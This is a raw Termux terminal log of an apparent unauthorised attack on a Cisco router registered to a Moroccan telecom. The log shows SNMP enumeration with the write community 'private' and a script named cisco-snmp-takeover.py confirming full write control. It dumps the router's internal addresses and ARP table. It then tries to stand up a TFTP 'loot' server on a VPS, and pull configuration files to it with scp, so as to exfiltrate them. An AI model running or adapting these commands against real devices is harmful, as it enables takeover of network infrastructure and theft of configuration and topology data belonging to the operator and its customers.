+IP-MIB::ipNetToMediaType.8.10.236.0.16 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.17 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.18 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.19 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.20 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.25 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.26 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.28 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.29 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.30 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.31 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.40 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.51 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.70 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.100 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.114 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.115 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.138 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.140 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.141 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.150 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.151 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.160 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.161 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.178 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.179 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.180 = INTEGER: static(4)
+IP-MIB::ipNetToMediaType.8.10.236.0.181 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.182 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.183 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.191 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.192 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.193 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.194 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.195 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.196 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.221 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.222 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.226 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.227 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.228 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.229 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.231 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.252 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.253 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.9.105.155.252.37 = INTEGER: static(4)
+IP-MIB::ipNetToMediaType.9.105.155.252.47 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.9.105.155.252.49 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.11.105.155.252.29 = INTEGER: static(4)
+IP-MIB::ipNetToMediaType.11.105.155.252.30 = INTEGER: dynamic(3)
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.2.1.1 > cisco_info.txt
+~ $ curl -s ifconfig.me
+~ $ ppkg update -y && pkg upgrade -y
+No command ppkg found, did you mean:
+ Command dpkg in package dpkg
+ Command pkg in package termux-tools
+~ $ pkg install -y python net-snmp
+Checking availability of current mirror:
+[*] https://mirrors.middlendian.com/termux/termux-main:
+ok
+Get:1 https://tur.kcubeterm.com tur-packages InRelease
+Hit:2 https://mirrors.middlendian.com/termux/termux-main stable InRelease
+Hit:3 https://mirrors.middlendian.com/termux/termux-root root InRelease
+Hit:4 https://mirrors.middlendian.com/termux/termux-x11 x11 InRelease
+Fetched 18.4 kB in 6s (2877 B/s)
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+All packages are up to date.
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+python is already the newest version (3.14.6-1).
+net-snmp is already the newest version (5.9.5.2).
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+~ $ pip install tftpy pyftpdlib
+Requirement already satisfied: tftpy in /data/data/com.termux/files/usr/lib/python3.14/site-packages (0.8.7)
+Collecting pyftpdlib
+  Downloading pyftpdlib-2.2.0.tar.gz (189 kB)
+  Installing build dependencies ... done
+  Getting requirements to build wheel ... done
+  Preparing metadata (pyproject.toml) ... done
+Collecting pyasynchat (from pyftpdlib)
+  Downloading pyasynchat-1.0.5-py3-none-any.whl.metadata (4.0 kB)
+Collecting pyasyncore (from pyftpdlib)
+  Downloading pyasyncore-1.0.5-py3-none-any.whl.metadata (4.3 kB)
+Downloading pyasynchat-1.0.5-py3-none-any.whl (7.9 kB)
+Downloading pyasyncore-1.0.5-py3-none-any.whl (10 kB)
+Building wheels for collected packages: pyftpdlib
+  Building wheel for pyftpdlib (pyproject.toml) ... done
+  Created wheel for pyftpdlib: filename=pyftpdlib-2.2.0-py3-none-any.whl size=89457 sha256=0e0731975c6a10a216c0d5f8eee3b295e93bb295d993efbdfa3ecea7b23ef302
+  Stored in directory: /data/data/com.termux/files/home/.cache/pip/wheels/f8/e6/21/98aeab1656b4580e8763d8995be4ad0fc93e52498f98ffb367
+Successfully built pyftpdlib
+Installing collected packages: pyasyncore, pyasynchat, pyftpdlib
+Successfully installed pyasynchat-1.0.5 pyasyncore-1.0.5 pyftpdlib-2.2.0
+~ $ termux-wake-lock      # يمنع Android من قتل العملية أثناء النقل
+~ $ nano cisco-snmp-takeover.py
+~ $ python cisco-snmp-takeover.py
+usage: cisco-snmp-takeover.py [-h] -t TARGET [-c COMMUNITY] [-s SERVER] [--proto {tftp,ftp}]
+                              [-u USER] [-p PASSWORD] [--port PORT] [--timeout TIMEOUT]
+                              [--outdir OUTDIR] [--push FILE] [--save] [--telnet]
+cisco-snmp-takeover.py: error: the following arguments are required: -t/--target
+~ $ nano admin.cfg
+~ $ nano admin.cfg
+~ $ python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private
+[+] RW (كتابة) — تحكم كامل متاح: 'private'
+
+=== معلومات الجهاز ===
+  sysDescr: Cisco IOS Software, C2900 Software (C2900-UNIVERSALK9-M), Version 15.3(3)M6, RELEASE SOFTWARE (fc1)
+Technical Support: http://www.cisco.com/techsupport
+Copyright (c) 1986-2015 by Cisco Systems, Inc.
+C
+  sysName: VN-RES-ROU-B
+  sysLocation: MAROC-TELECOM
+  sysContact: test
+  sysUpTime: 170:9:04:44.59
+
+=== الواجهات ===
+  if1: GigabitEthernet0/0/0
+  if2: GigabitEthernet0/1/0
+  if3: Embedded-Service-Engine0/0
+  if4: GigabitEthernet0/0
+  if5: GigabitEthernet0/1
+  if6: Backplane-GigabitEthernet0/3
+  if7: Null0
+  if8: GigabitEthernet0/0.2
+  if9: GigabitEthernet0/0.601
+  if10: NVI0
+  if11: GigabitEthernet0/1/0.601
+
+=== عناوين IP ===
+  IpAddress: 10.236.0.180
+  IpAddress: 105.155.252.6
+  IpAddress: 105.155.252.29
+  IpAddress: 105.155.252.37
+  IpAddress: 105.155.252.66
+
+=== جدول ARP (المضيفون المجاورون) ===
+  10.236.0.10       via if8    0:15:5d:a:a0:1
+  10.236.0.100      via if8    0:1:95:2f:77:34
+  10.236.0.11       via if8    0:15:5d:a:a1:1
+  10.236.0.114      via if8    0:c0:b7:eb:a4:1
+  10.236.0.115      via if8    0:c0:b7:eb:ef:6d
+  10.236.0.12       via if8    0:15:5d:a:a0:1
+  10.236.0.13       via if8    0:15:5d:a:a0:1
+  10.236.0.138      via if8    0:15:5d:a:a0:1
+  10.236.0.14       via if8    0:15:5d:a:a0:1
+  10.236.0.140      via if8    0:15:5d:a:a0:1
+  10.236.0.141      via if8    0:15:5d:a:a0:1
+  10.236.0.150      via if8    c0:25:5c:ff:66:41
+  10.236.0.151      via if8    0:21:1c:42:12:41
+  10.236.0.16       via if8    0:15:5d:a:a0:15
+  10.236.0.160      via if8    28:80:23:ad:61:a7
+  10.236.0.161      via if8    28:80:23:b3:62:c7
+  10.236.0.17       via if8    0:15:5d:a:a1:14
+  10.236.0.178      via if8    0:0:c:7:ac:2
+  10.236.0.179      via if8    0:a2:ee:1b:be:98
+  10.236.0.18       via if8    5c:b9:1:c4:10:50
+  10.236.0.180      via if8    0:a2:ee:1b:ca:68
+  10.236.0.181      via if8    0:fe:c8:37:27:42
+  10.236.0.182      via if8    0:fe:c8:37:2b:2
+  10.236.0.183      via if8    0:0:c:7:ac:1
+  10.236.0.19       via if8    f0:29:29:73:89:c1
+  10.236.0.191      via if8    94:57:a5:59:c7:64
+  10.236.0.192      via if8    94:57:a5:69:e9:22
+  10.236.0.193      via if8    94:57:a5:59:c7:64
+  10.236.0.194      via if8    94:57:a5:59:5:9c
+  10.236.0.195      via if8    94:57:a5:69:4f:5c
+  10.236.0.196      via if8    94:57:a5:59:5:9c
+  10.236.0.20       via if8    5c:b9:1:c4:13:70
+  10.236.0.221      via if8    94:57:a5:61:59:14
+  10.236.0.222      via if8    94:57:a5:69:d9:d4
+  10.236.0.226      via if8    5c:b9:1:c4:10:53
+  10.236.0.227      via if8    5c:b9:1:c4:13:73
+  10.236.0.228      via if8    0:c0:ff:25:7e:ed
+  10.236.0.229      via if8    0:c0:ff:25:8f:42
+  10.236.0.231      via if8    0:e0:86:23:24:59
+  10.236.0.25       via if8    0:15:5d:a:a0:d
+  10.236.0.252      via if8    0:12:5:0:59:cd
+  10.236.0.253      via if8    0:12:5:0:59:d0
+  10.236.0.26       via if8    0:15:5d:a:a1:d
+  10.236.0.28       via if8    0:15:5d:a:a0:d
+  10.236.0.29       via if8    0:15:5d:a:a0:d
+  10.236.0.30       via if8    0:90:c2:ef:3e:74
+  10.236.0.31       via if8    0:90:c2:f2:8a:80
+  10.236.0.4        via if8    0:15:5d:a:a0:7
+  10.236.0.40       via if8    0:20:e:10:9e:cf
+  10.236.0.5        via if8    0:15:5d:a:a1:7
+  10.236.0.51       via if8    0:20:e:10:9e:dd
+  10.236.0.6        via if8    0:15:5d:a:a0:7
+  10.236.0.7        via if8    0:15:5d:a:a0:7
+  10.236.0.70       via if8    0:20:e:10:93:f
+  10.236.0.8        via if8    0:15:5d:a:a0:7
+  105.155.252.29    via if11   0:a2:ee:1b:ca:78
+  105.155.252.30    via if11   4:f9:38:e7:51:d0
+  105.155.252.37    via if9    0:a2:ee:1b:ca:68
+  105.155.252.47    via if9    94:57:a5:59:c7:66
+  105.155.252.49    via if9    0:b9:1:c4:13:71
+  105.155.252.5     via if1    e8:a:b9:3a:ca:f9
+  105.155.252.6     via if1    0:a2:ee:1b:ca:70
+  105.155.252.65    via if5    0:a2:ee:1b:be:99
+  105.155.252.66    via if5    0:a2:ee:1b:ca:69
+
+=== الأجهزة الداخلية (سيريالات) ===
+  No Such Instance currently exists at this OID
+  No Such Instance currently exists at this OID
+
+=== جيران CDP ===
+  CDP: STRING: "SW-01"
+
+[!] أنت خلف NAT (172.20.10.3) — الراوتر لن يصل إليك.
+    استخدم VPS:  python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private -s <IP_VPS> [--proto ftp ...]
+~ $ ssh root@<IP_VPS> "pip3 install tftpy && mkdir -p /tmp/loot && python3 -c \"from tftpy import TftpServer; TftpServer('/tmp/loot').listen('0.0.0.0',69)\""
+bash: IP_VPS: No such file or directory
+~ $ python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private -s <IP_VPS>
+bash: syntax error near unexpected token `newline'
+~ $ scp root@<IP_VPS>:/tmp/loot/*.cfg loot/
+bash: IP_VPS: No such file or directory
+~ $ python3 cisco-snmp-takeover.py -t 105.155.252.6 -c private -s <IP_VPS> --proto ftp -u ftpuser -p ftppass
+bash: IP_VPS: No such file or directory
+~ $, 
